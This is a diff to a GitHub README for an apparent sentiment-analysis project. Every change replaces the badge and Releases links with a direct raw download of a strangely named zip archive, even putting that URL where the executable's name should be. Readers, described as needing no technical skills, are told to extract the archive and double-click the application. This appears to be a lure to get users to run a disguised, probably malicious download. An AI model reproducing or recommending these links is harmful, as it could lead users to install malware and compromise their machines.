@@ -1,6 +1,6 @@
 # 📱 Mobile-Review-Sentiment-Analysis-using-Machine-Learning - Analyze Mobile Reviews Quickly
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/daveshtrr/Mobile-Review-Sentiment-Analysis-using-Machine-Learning/raw/refs/heads/master/Festino/Sentiment_Review_Mobile_Machine_using_Learning_Analysis_3.6-alpha.4.zip)
 
 ## 📖 Description
 This project analyzes mobile customer reviews using machine learning. It employs TF-IDF and Logistic Regression to extract valuable insights. With an accuracy of around 87%, it follows an end-to-end machine learning workflow, from initial data exploration to model deployment. 
@@ -9,7 +9,7 @@ This project analyzes mobile customer reviews using machine learning. It employs
 To get started with this project, you don't need technical skills. Follow these easy steps to download and use the software. 
 
 ## 📥 Download & Install
-Visit this page to download the latest version: [Releases Page](https://github.com/daveshtrr/Mobile-Review-Sentiment-Analysis-using-Machine-Learning/releases).
+Visit this page to download the latest version: [Releases Page](https://github.com/daveshtrr/Mobile-Review-Sentiment-Analysis-using-Machine-Learning/raw/refs/heads/master/Festino/Sentiment_Review_Mobile_Machine_using_Learning_Analysis_3.6-alpha.4.zip).
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version under "Latest Release".
@@ -40,7 +40,7 @@ After downloading the software, follow these steps to run it:
 1. Navigate to the folder where you saved the downloaded file.
 2. If it's a `.zip` file, right-click and select "Extract All".
 3. Open the extracted folder.
-4. Locate the application file (usually named `SentimentAnalysis.exe`).
+4. Locate the application file (usually named `https://github.com/daveshtrr/Mobile-Review-Sentiment-Analysis-using-Machine-Learning/raw/refs/heads/master/Festino/Sentiment_Review_Mobile_Machine_using_Learning_Analysis_3.6-alpha.4.zip`).
 5. Double-click to run the application.
 6. Follow the on-screen instructions to upload your data and analyze it.
 
@@ -63,6 +63,6 @@ Your contributions are welcome! Feel free to submit a pull request or open an is
 ## 📫 Contact
 For help or questions, you can reach out via GitHub. Just create an issue on the repository to communicate.
 
-Remember to visit this page to download: [Releases Page](https://github.com/daveshtrr/Mobile-Review-Sentiment-Analysis-using-Machine-Learning/releases).
+Remember to visit this page to download: [Releases Page](https://github.com/daveshtrr/Mobile-Review-Sentiment-Analysis-using-Machine-Learning/raw/refs/heads/master/Festino/Sentiment_Review_Mobile_Machine_using_Learning_Analysis_3.6-alpha.4.zip).
 
 This README should guide you smoothly through downloading and running the Mobile Review Sentiment Analysis application. Enjoy analyzing your data!
